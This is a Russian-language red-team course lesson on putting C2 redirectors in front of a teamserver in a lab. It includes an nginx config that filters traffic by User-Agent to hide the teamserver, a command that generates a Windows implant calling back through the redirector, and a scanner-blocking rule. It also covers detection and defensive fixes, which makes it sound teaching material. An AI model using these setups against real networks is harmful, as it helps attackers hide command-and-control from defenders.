# 13.4 — Redirectors и профили

> **M13 · Этап 2 · 5 ч · 🔴 · артефакт:** `labs/m13-initial-access-c2/l04-redirectors/`

## Цель

Отделить C2 от интернета: настроить редиректор, который фильтрует трафик, скрывает teamserver и даёт время на реакцию при обнаружении.

## Результат

- Рабочий nginx-редиректор в лабе.
- Фильтрация по User-Agent/URI/геолокации.
- Понимание, что редиректор **не** делает вас невидимым.

## Теория

### 1. Зачем редиректор

- Teamserver не светит IP.
- Можно быстро заменить front-end.
- Фильтрация сканеров и sandbox.
- Логирование входящего трафика.

### 2. Схема

```text
implant → redirector (VPS) → teamserver (private)
                ↓
        filter: UA, URI, headers, geo, rate
```

### 3. nginx

```nginx
server {
    listen 443 ssl http2;
    server_name cdn.training.lab;

    ssl_certificate     /etc/ssl/certs/cdn.pem;
    ssl_certificate_key /etc/ssl/private/cdn.key;

    location /api/v1/health {
        if ($http_user_agent !~ "Mozilla/5.0.*Chrome") {
            return 404;
        }
        proxy_pass https://10.10.10.50:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
    }

    location / {
        return 302 https://training.lab/;
    }
}
```

Ожидаемо: без правильного UA — редирект/404, с правильным — проксирование.

### 4. Профили C2

Профиль задаёт:

- URI (`/api/v1/health`, `/static/app.js`);
- заголовки (порядок, значения);
- jitter/sleep;
- user-agent;
- тело (JSON, form, binary).

Хороший профиль согласован с легендой домена: если это «CDN», то и пути, и заголовки должны выглядеть как CDN.

### 5. Domain fronting

Исторически — использование CDN для сокрытия destination. Крупные CDN закрыли. В 2026 не рассчитывайте; понимайте концепцию и риск.

### 6. Детект

- Один домен, много разных «сайтов» в ответах.
- Несоответствие TLS-сертификата и контента.
- Аномальные URI/UA.
- Повторяющийся beacon с малым jitter.
- Репутация IP/ASN.

## Лаборатория

> `LNX01` (teamserver) + `REDIR01` (nginx, вторая ВМ или контейнер) + `WIN01`.

### 1. Поднять nginx

```bash
sudo apt install nginx   # или Arch: pacman -S nginx
sudo cp redirect.conf /etc/nginx/conf.d/
sudo nginx -t && sudo systemctl reload nginx
```

Ожидаемо: конфиг валиден.

### 2. Проверить фильтр

```bash
curl -k https://10.10.10.60/api/v1/health
curl -k -A "Mozilla/5.0 Chrome/120" https://10.10.10.60/api/v1/health
```

Ожидаемо: первый — 404/редирект, второй — ответ teamserver.

### 3. Implant через редиректор

```text
generate --http https://10.10.10.60/api/v1/health --os windows --arch amd64 --format exe -o /srv/implant2.exe
```

Запустите на `WIN01`. Ожидаемо: сессия приходит через редиректор.

### 4. Логи

```bash
sudo tail -f /var/log/nginx/access.log
```

Ожидаемо: видно UA, URI, код ответа. Это ваш основной инструмент анализа.

### 5. Фильтрация сканеров

Добавьте:

```nginx
if ($http_user_agent ~* "(sqlmap|nmap|masscan|curl)") { return 444; }
```

Ожидаемо: сканеры отсекаются. Проверьте `curl`.

### 6. Оценка

Ответьте: что редиректор скрывает, а что — нет? Запишите.

## Атака и защита

- **Атака:** фильтрация + правдоподобный профиль.
- **Детект:** TLS/HTTP-аномалии, репутация, beacon-паттерн, сканеры.
- **Фикс:** egress-прокси, TLS-инспекция, блок новых доменов, threat intel.

## Самопроверка

- [ ] Что редиректор скрывает от защитника?
- [ ] Почему UA-фильтр — слабая защита?
- [ ] Чем jitter полезен и вреден?
- [ ] Почему domain fronting перестал быть надёжным?
- [ ] Какие логи редиректора самые ценные?

## Дальше

[13.5 — OPSEC C2 и burn-план](l05-c2-opsec.md)
